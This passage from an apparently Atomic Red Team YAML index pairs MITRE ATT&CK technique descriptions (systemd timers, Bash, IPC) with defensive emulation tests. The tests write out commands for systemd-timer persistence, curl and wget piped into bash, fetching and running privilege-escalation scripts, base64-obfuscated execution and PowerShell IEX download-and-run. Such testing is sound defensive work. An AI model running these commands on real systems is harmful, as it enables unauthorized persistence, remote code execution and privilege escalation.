        Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.

        An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_detection: |-
        Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

        Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

        Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'File: File Modification'
      - 'Scheduled Job: Scheduled Job Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
      - root
      x_mitre_remote_support: true
      identifier: T1053.006
    atomic_tests:
    - name: Create Systemd Service and Timer
      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
      description: "This test creates Systemd service and timer then starts and enables
        the Systemd timer \n"
      supported_platforms:
      - linux
      input_arguments:
        path_to_systemd_service:
          description: Path to systemd service unit file
          type: path
          default: "/etc/systemd/system/art-timer.service"
        path_to_systemd_timer:
          description: Path to service timer file
          type: path
          default: "/etc/systemd/system/art-timer.timer"
        systemd_service_name:
          description: Name of systemd service
          type: string
          default: art-timer.service
        systemd_timer_name:
          description: Name of systemd service timer
          type: string
          default: art-timer.timer
      executor:
        command: |
          echo "[Unit]" > #{path_to_systemd_service}
          echo "Description=Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_service}
          echo "[Service]" >> #{path_to_systemd_service}
          echo "Type=simple" >> #{path_to_systemd_service}
          echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> #{path_to_systemd_service}
          echo "[Install]" >> #{path_to_systemd_service}
          echo "WantedBy=multi-user.target" >> #{path_to_systemd_service}
          echo "[Unit]" > #{path_to_systemd_timer}
          echo "Description=Executes Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_timer}
          echo "Requires=#{systemd_service_name}" >> #{path_to_systemd_timer}
          echo "[Timer]" >> #{path_to_systemd_timer}
          echo "Unit=#{systemd_service_name}" >> #{path_to_systemd_timer}
          echo "OnCalendar=*-*-* *:*:00" >> #{path_to_systemd_timer}
          echo "[Install]" >> #{path_to_systemd_timer}
          echo "WantedBy=timers.target" >> #{path_to_systemd_timer}
          systemctl start #{systemd_timer_name}
          systemctl enable #{systemd_timer_name}
          systemctl daemon-reload
        cleanup_command: |
          systemctl stop #{systemd_timer_name}
          systemctl disable #{systemd_timer_name}
          rm #{path_to_systemd_service}
          rm #{path_to_systemd_timer}
          systemctl daemon-reload
        name: bash
    - name: Create a user level transient systemd service and timer
      auto_generated_guid: 3de33f5b-62e5-4e63-a2a0-6fd8808c80ec
      description: "Schedule a user level transient task (will not survive a reboot)
        without having to create the .timer or .service files by using the systemd-run
        command. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if systemd-run exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
          exit 1; fi;

          '
        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;

          '
      executor:
        elevation_required: false
        command: 'systemd-run --user --unit=Atomic-Red-Team --on-calendar ''*:0/1''
          /bin/sh -c ''echo "$(date) $(whoami)" >>/tmp/log''

          '
        cleanup_command: |
          systemctl --user stop Atomic-Red-Team.service
          systemctl --user stop Atomic-Red-Team.timer
          rm /tmp/log
        name: sh
    - name: Create a system level transient systemd service and timer
      auto_generated_guid: d3eda496-1fc0-49e9-aff5-3bec5da9fa22
      description: "Schedule a system level transient task (will not survive a reboot)
        without having to create the .timer or .service files by using the systemd-run
        command. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if systemd-run exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v systemd-run)" ]; then exit 0; else
          exit 1; fi;

          '
        get_prereq_command: 'echo "Install systemd on the machine."; exit 1;

          '
      executor:
        elevation_required: true
        command: 'systemd-run --unit=Atomic-Red-Team --on-calendar ''*:0/1'' /bin/sh
          -c ''echo "$(date) $(whoami)" >>/tmp/log''

          '
        cleanup_command: |
          systemctl stop Atomic-Red-Team.service
          systemctl stop Atomic-Red-Team.timer
          rm /tmp/log
        name: sh
  T1061:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228
      type: attack-pattern
      created: '2017-05-31T21:30:50.342Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1061
        url: https://attack.mitre.org/techniques/T1061
      - url: https://en.wikipedia.org/wiki/Run_command
        description: Wikipedia. (2018, August 3). Run Command. Retrieved October 12,
          2018.
        source_name: Wikipedia Run Command
      modified: '2020-03-30T13:38:08.738Z'
      name: Graphical User Interface
      description: |-
        **This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.**

        The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: "Detection of execution through the GUI will likely lead
        to significant false positives. Other factors should be considered to detect
        misuse of services that can lead to adversaries gaining access to systems
        through interactive remote sessions. \n\nUnknown or unusual process launches
        outside of normal behavior on a particular system occurring through remote
        interactive sessions are suspicious. Collect and audit security logs that
        may indicate access to and use of Legitimate Credentials to access remote
        systems within the network."
      x_mitre_deprecated: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1059.004:
    technique:
      x_mitre_platforms:
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56
      type: attack-pattern
      created: '2020-03-09T14:15:05.330Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1059.004
        url: https://attack.mitre.org/techniques/T1059/004
      - source_name: DieNet Bash
        url: https://linux.die.net/man/1/bash
        description: die.net. (n.d.). bash(1) - Linux man page. Retrieved June 12,
          2020.
      - source_name: Apple ZShell
        url: https://support.apple.com/HT208050
        description: Apple. (2020, January 28). Use zsh as the default shell on your
          Mac. Retrieved June 12, 2020.
      modified: '2021-07-26T22:34:43.261Z'
      name: 'Command and Scripting Interpreter: Bash'
      description: |-
        Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

        Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

        Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: "Unix shell usage may be common on administrator, developer,
        or power user systems, depending on job function. If scripting is restricted
        for normal users, then any attempt to enable scripts running on a system would
        be considered suspicious. If scripts are not commonly used on a system, but
        enabled, scripts running out of cycle from patching or other administrator
        functions are suspicious. Scripts should be captured from the file system
        when possible to determine their actions and intent.\n\nScripts are likely
        to perform actions with various effects on a system that may generate events,
        depending on the types of monitoring used. Monitor processes and command-line
        arguments for script execution and subsequent behavior. Actions may be related
        to network and system information discovery, collection, or other scriptable
        post-compromise behaviors and could be used as indicators of detection leading
        back to the source script. "
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
      - root
      x_mitre_remote_support: true
      identifier: T1059.004
    atomic_tests:
    - name: Create and Execute Bash Shell Script
      auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
      description: 'Creates and executes a simple bash script.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        script_path:
          description: Script path
          type: path
          default: "/tmp/art.sh"
      executor:
        command: |
          sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
          sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
          chmod +x #{script_path}
          sh #{script_path}
        cleanup_command: 'rm #{script_path}

          '
        name: sh
    - name: Command-Line Interface
      auto_generated_guid: d0c88567-803d-4dca-99b4-7ce65e7b257c
      description: |
        Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

        Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
      supported_platforms:
      - macos
      - linux
      executor:
        command: |
          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
        cleanup_command: 'rm /tmp/art-fish.txt

          '
        name: sh
    - name: Harvest SUID executable files
      auto_generated_guid: 46274fc6-08a7-4956-861b-24cbbaa0503c
      description: "AutoSUID application is the Open-Source project, the main idea
        of which is to automate harvesting the SUID executable files and to find a
        way for further escalating the privileges. \n"
      supported_platforms:
      - linux
      input_arguments:
        autosuid:
          description: Path to the autosuid shell script
          type: path
          default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
        autosuid_url:
          description: Path to download autosuid shell script
          type: url
          default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh
      dependency_executor_name: bash
      dependencies:
      - description: 'AutoSUID must exist on disk at specified location (#{autosuid})

          '
        prereq_command: 'if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'curl --create-dirs #{autosuid_url} --output #{autosuid}

          '
      executor:
        command: |
          chmod +x #{autosuid}
          bash #{autosuid}
        cleanup_command: 'rm -rf #{autosuid}

          '
        name: sh
    - name: LinEnum tool execution
      auto_generated_guid: a2b35a63-9df1-4806-9a4d-5fe0500845f2
      description: 'LinEnum is a bash script that performs discovery commands for
        accounts,processes, kernel version, applications, services, and uses the information
        from these commands to present operator with ways of escalating privileges
        or further exploitation of targeted host.

        '
      supported_platforms:
      - linux
      input_arguments:
        linenum:
          description: Path to the LinEnum shell script
          type: path
          default: PathToAtomicsFolder/T1059.004/src/LinEnum.sh
        linenum_url:
          description: Path to download LinEnum shell script
          type: url
          default: https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh
      dependency_executor_name: bash
      dependencies:
      - description: 'LinnEnum must exist on disk at specified location (#{linenum})

          '
        prereq_command: 'if [ -f #{linenum} ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'curl --create-dirs #{linenum_url} --output #{linenum}

          '
      executor:
        command: |
          chmod +x #{linenum}
          bash #{linenum}
        cleanup_command: 'rm -rf #{linenum}

          '
        name: sh
    - name: New script file in the tmp directory
      auto_generated_guid: 8cd1947b-4a54-41fb-b5ea-07d0ace04f81
      description: 'An attacker may create script files in the /tmp directory using
        the mktemp utility and execute them. The following commands creates a temp
        file and places a pointer to it in the variable $TMPFILE, echos the string
        id into it, and then executes the file using bash, which results in the id
        command being executed.

        '
      supported_platforms:
      - linux
      executor:
        name: sh
        elevation_required: false
        command: |
          TMPFILE=$(mktemp)
          echo "id" > $TMPFILE
          bash $TMPFILE
        cleanup_command: |
          rm $TMPFILE
          unset TMPFILE
    - name: What shell is running
      auto_generated_guid: 7b38e5cc-47be-44f0-a425-390305c76c17
      description: 'An adversary will want to discover what shell is running so that
        they can tailor their attacks accordingly. The following commands will discover
        what shell is running.

        '
      supported_platforms:
      - linux
      executor:
        name: sh
        elevation_required: false
        command: |
          echo $0
          if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
          if $(printenv SHELL >/dev/null); then printenv SHELL; fi
    - name: What shells are available
      auto_generated_guid: bf23c7dc-1004-4949-8262-4c1d1ef87702
      description: 'An adversary may want to discover which shell''s are available
        so that they might switch to that shell to tailor their attacks to suit that
        shell. The following commands will discover what shells are available on the
        host.

        '
      supported_platforms:
      - linux
      executor:
        name: sh
        elevation_required: false
        command: "cat /etc/shells \n"
    - name: Command line scripts
      auto_generated_guid: b04ed73c-7d43-4dc8-b563-a2fc595cba1a
      description: 'An adversary may type in elaborate multi-line shell commands into
        a terminal session because they can''t or don''t wish to create script files
        on the host. The following command is a simple loop, echoing out Atomic Red
        Team was here!

        '
      supported_platforms:
      - linux
      executor:
        name: sh
        command: 'for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep
          1; done

          '
    - name: Obfuscated command line scripts
      auto_generated_guid: 5bec4cc8-f41e-437b-b417-33ff60acf9af
      description: 'An adversary may pre-compute the base64 representations of the
        terminal commands that they wish to execute in an attempt to avoid or frustrate
        detection. The following commands base64 encodes the text string id, then
        base64 decodes the string, then pipes it as a command to bash, which results
        in the id command being executed.

        '
      supported_platforms:
      - linux
      executor:
        name: sh
        elevation_required: false
        command: "ART=$(echo -n \"id\" |base64 -w 0)\necho \"\\$ART=$ART\"\necho -n
          \"$ART\" |base64 -d |/bin/bash\nunset ART \n"
    - name: Change login shell
      auto_generated_guid: c7ac59cb-13cc-4622-81dc-6d2fee9bfac7
      description: "An adversary may want to use a different login shell. The chsh
        command changes the user login shell. The following test, creates an art user
        with a /bin/bash shell, changes the users shell to sh, then deletes the art
        user. \n"
      supported_platforms:
      - linux
      dependencies:
      - description: 'chsh - change login shell, must be installed

          '
        prereq_command: 'if [ -f /usr/bin/chsh ]; then echo "exit 0"; else echo "exit
          1"; exit 1; fi

          '
        get_prereq_command: 'echo "Automated installer not implemented yet, please
          install chsh manually"

          '
      executor:
        name: bash
        elevation_required: true
        command: |
          useradd -s /bin/bash art
          cat /etc/passwd |grep ^art
          chsh -s /bin/sh art
          cat /etc/passwd |grep ^art
        cleanup_command: 'userdel art

          '
    - name: Environment variable scripts
      auto_generated_guid: bdaebd56-368b-4970-a523-f905ff4a8a51
      description: 'An adversary may place scripts in an environment variable because
        they can''t or don''t wish to create script files on the host. The following
        test, in a bash shell, exports the ART variable containing an echo command,
        then pipes the variable to /bin/bash

        '
      supported_platforms:
      - linux
      executor:
        name: bash
        elevation_required: false
        command: |
          export ART='echo "Atomic Red Team was here... T1059.004"'
          echo $ART |/bin/bash
        cleanup_command: 'unset ART

          '
    - name: Detecting pipe-to-shell
      auto_generated_guid: fca246a8-a585-4f28-a2df-6495973976a1
      description: 'An adversary may develop a useful utility or subvert the CI/CD
        pipe line of a legitimate utility developer, who requires or suggests installing
        their utility by piping a curl download directly into bash. Of-course this
        is a very bad idea. The adversary may also take advantage of this BLIND install
        method and selectively running extra commands in the install script for those
        who DO pipe to bash and not for those who DO NOT. This test uses curl to download
        the pipe-to-shell.sh script, the first time without piping it to bash and
        the second piping it into bash which executes the echo command.

        '
      supported_platforms:
      - linux
      input_arguments:
        remote_url:
          description: url of remote payload
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if running on a Debian based machine.

          '
        prereq_command: |
          if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
          if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
        get_prereq_command: 'apt update && apt install -y curl

          '
      executor:
        name: bash
        elevation_required: false
        command: "cd /tmp\ncurl -s #{remote_url}\nls -la /tmp/art.txt\ncurl -s #{remote_url}
          |bash\nls -la /tmp/art.txt      \n"
        cleanup_command: 'rm /tmp/art.txt

          '
  T1559:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d
      type: attack-pattern
      created: '2020-02-12T14:08:48.689Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1559
        url: https://attack.mitre.org/techniques/T1559
      - source_name: Linux IPC
        url: https://www.geeksforgeeks.org/inter-process-communication-ipc/#:~:text=Inter%2Dprocess%20communication%20(IPC),of%20co%2Doperation%20between%20them.
        description: N/A. (2021, April 1). Inter Process Communication (IPC). Retrieved
          March 11, 2022.
      - source_name: Fireeye Hunting COM June 2019
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
      modified: '2022-03-11T20:23:23.122Z'
      name: Inter-Process Communication
      description: "Adversaries may abuse inter-process communication (IPC) mechanisms
        for local code or command execution. IPC is typically used by processes to
        share data, communicate with each other, or synchronize execution. IPC is
        also commonly used to avoid situations such as deadlocks, which occurs when
        processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse
        IPC to execute arbitrary code or commands. IPC mechanisms may differ depending
        on OS, but typically exists in a form accessible through programming languages/libraries
        or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)
        or [Component Object Model](https://attack.mitre.org/techniques/T1559/001).
        Linux environments support several different IPC mechanisms, two of which
        being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums,
        such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s,
        may also leverage underlying IPC mechanisms. Adversaries may also use [Remote
        Services](https://attack.mitre.org/techniques/T1021) such as [Distributed
        Component Object Model](https://attack.mitre.org/techniques/T1021/003) to
        facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Monitor for strings in files/commands, loaded DLLs/libraries,
        or spawned processes that are associated with abuse of IPC mechanisms.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Access'
      - 'Module: Module Load'
      - 'Process: Process Creation'
      - 'Script: Script Execution'
      x_mitre_permissions_required:
      - Administrator
      - User
      - SYSTEM
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
      identifier: T1559
    atomic_tests:
    - name: Cobalt Strike Artifact Kit pipe
      auto_generated_guid: bd13b9fc-b758-496a-b81a-397462f82c72
      description: |
        Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

        The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Named pipe executors must exist on disk

          '
        prereq_command: 'if ((Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_client.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_server.exe))
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
          $zipUrl  = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
          Invoke-FetchFromZip $zipUrl "*.exe" "PathToAtomicsFolder\T1559\bin"
      executor:
        command: '"PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe" --pipe
          1

          '
        name: command_prompt
    - name: Cobalt Strike Lateral Movement (psexec_psh) pipe
      auto_generated_guid: 830c8b6c-7a70-4f40-b975-8bbe74558acd
      description: |
        Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

        The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Named pipe executors must exist on disk

          '
        prereq_command: 'if ((Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_client.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_server.exe))
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
          $zipUrl  = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
          Invoke-FetchFromZip $zipUrl "*.exe" "PathToAtomicsFolder\T1559\bin"
      executor:
        command: '"PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe" --pipe
          2

          '
        name: command_prompt
    - name: Cobalt Strike SSH (postex_ssh) pipe
      auto_generated_guid: d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6
      description: |
        Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

        The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Named pipe executors must exist on disk

          '
        prereq_command: 'if ((Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_client.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_server.exe))
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
          $zipUrl  = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
          Invoke-FetchFromZip $zipUrl "*.exe" "PathToAtomicsFolder\T1559\bin"
      executor:
        command: '"PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe" --pipe
          3

          '
        name: command_prompt
    - name: Cobalt Strike post-exploitation pipe (4.2 and later)
      auto_generated_guid: 7a48f482-246f-4aeb-9837-21c271ebf244
      description: |
        Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

        The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Named pipe executors must exist on disk

          '
        prereq_command: 'if ((Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_client.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_server.exe))
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
          $zipUrl  = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
          Invoke-FetchFromZip $zipUrl "*.exe" "PathToAtomicsFolder\T1559\bin"
      executor:
        command: '"PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe" --pipe
          4

          '
        name: command_prompt
    - name: Cobalt Strike post-exploitation pipe (before 4.2)
      auto_generated_guid: 8dbfc15c-527b-4ab0-a272-019f469d367f
      description: |
        Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

        The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Named pipe executors must exist on disk

          '
        prereq_command: 'if ((Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_client.exe)
          -and (Test-Path PathToAtomicsFolder\T1559\bin\build\namedpipes_server.exe))
          {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
          $zipUrl  = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
          Invoke-FetchFromZip $zipUrl "*.exe" "PathToAtomicsFolder\T1559\bin"
      executor:
        command: '"PathToAtomicsFolder\T1559\bin\build\namedpipes_executor.exe" --pipe
          5

          '
        name: command_prompt
  T1204.003:
    technique:
      x_mitre_platforms:
      - IaaS
      - Containers
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Center for Threat-Informed Defense (CTID)
      - Vishwas Manral, McAfee
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec
      type: attack-pattern
      created: '2021-03-30T17:20:05.789Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1204.003
        url: https://attack.mitre.org/techniques/T1204/003
      - source_name: Summit Route Malicious AMIs
        url: https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/
        description: Piper, S.. (2018, September 24). Investigating Malicious AMIs.
          Retrieved March 30, 2021.
      - source_name: Aqua Security Cloud Native Threat Report June 2021
        url: https://info.aquasec.com/hubfs/Threat%20reports/AquaSecurity_Cloud_Native_Threat_Report_2021.pdf?utm_campaign=WP%20-%20Jun2021%20Nautilus%202021%20Threat%20Research%20Report&utm_medium=email&_hsmi=132931006&_hsenc=p2ANqtz-_8oopT5Uhqab8B7kE0l3iFo1koirxtyfTehxF7N-EdGYrwk30gfiwp5SiNlW3G0TNKZxUcDkYOtwQ9S6nNVNyEO-Dgrw&utm_content=132931006&utm_source=hs_automation
        description: Team Nautilus. (2021, June). Attacks in the Wild on the Container
          Supply Chain and Infrastructure. Retrieved August 26, 2021.
      modified: '2021-08-26T16:42:35.318Z'
      name: 'User Execution: Malicious Image'
      description: |-
